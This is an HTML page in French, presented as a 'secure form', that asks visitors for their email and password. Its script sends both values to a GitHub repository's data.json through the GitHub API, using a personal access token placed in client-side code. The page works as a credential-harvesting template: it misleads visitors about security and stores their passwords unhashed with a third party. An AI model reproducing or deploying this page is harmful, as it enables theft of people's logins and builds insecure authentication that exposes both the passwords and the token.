<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire sécurisé</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 20px 0;
        }
        h1 {
            margin: 0;
        }
        form {
            margin-top: 20px;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            width: 80%;
            max-width: 300px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        footer {
            margin-top: 20px;
            font-size: 0.9em;
            color: #999;
        }
    </style>
</head>
<body>
    <header>
        <h1>Formulaire sécurisé</h1>
    </header>
    <p>Veuillez entrer vos identifiants ci-dessous :</p>
    <form id="loginForm">
        <label for="email">Email :</label><br>
        <input type="email" id="email" name="email" required><br>
        <label for="password">Mot de passe :</label><br>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Envoyer</button>
    </form>

    <footer>
        &copy; 2024 Formulaire Sécurisé
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (event) => {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const data = {
                email: email,
                password: password
            };

            try {
                const response = await fetch('https://api.github.com/repos/<TON-NOM-DUTILISATEUR>/<TON-DÉPÔT>/contents/data.json', {
                    method: 'PUT',
                    headers: {
                        'Authorization': 'Bearer <TON-TOKEN-PERSONNEL>',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        message: "Ajout des identifiants",
                        content: btoa(JSON.stringify(data))
                    })
                });

                if (response.ok) {
                    alert('Identifiants sauvegardés sur GitHub!');
                } else {
                    alert('Erreur lors de la sauvegarde.');
                }
            } catch (error) {
                console.error('Erreur:', error);
                alert('Impossible de sauvegarder les identifiants.');
            }
        });
    </script>
</body>
</html>
